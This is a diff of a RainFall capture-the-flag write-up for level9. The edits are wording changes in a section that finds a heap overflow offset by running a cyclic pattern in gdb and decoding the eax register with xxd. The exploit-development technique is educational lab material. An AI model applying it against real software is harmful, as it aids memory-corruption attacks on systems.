@@ -82,9 +82,11 @@ level9@RainFall:~$ gdb -q level9
 
 ### Find n2 offset
 
-We need to find out how many bytes we write in ```n1``` before we overflow into ```n2```? ```n2``` corresponds to register ```eax``` at time of segfault.
+We need to find out how many bytes we write in ```n1``` before we overflow into ```n2```?
 
 Lets run the binary with our a pattern string from our favorite [EIP offset tool](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/) and make it segfault.
+
+We can see ```n2``` corresponds to register ```eax``` at time of segfault.
 ```
 (gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6A
 Starting program: /home/user/level9/level9 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6A
@@ -94,7 +96,7 @@ Program received signal SIGSEGV, Segmentation fault.
 (gdb) info register eax
 eax            0x41366441	1094083649
 ```
-lets convert the contents of ```eax``` from hex to ascii with ```xxd```
+Lets convert the contents of ```eax``` from hex to ascii with ```xxd```
 ```
 >$ echo 0x41366441 | xxd -r -p | rev
 Ad6A
